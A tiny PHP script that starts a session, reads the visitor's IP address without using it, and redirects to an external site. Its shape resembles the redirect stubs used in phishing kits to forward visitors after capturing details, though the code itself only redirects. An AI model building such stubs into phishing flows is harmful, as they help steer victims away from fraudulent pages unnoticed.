<?php
session_start();
$ip = getenv("REMOTE_ADDR");

header("Location: https://helloglue.com.tr/");
?>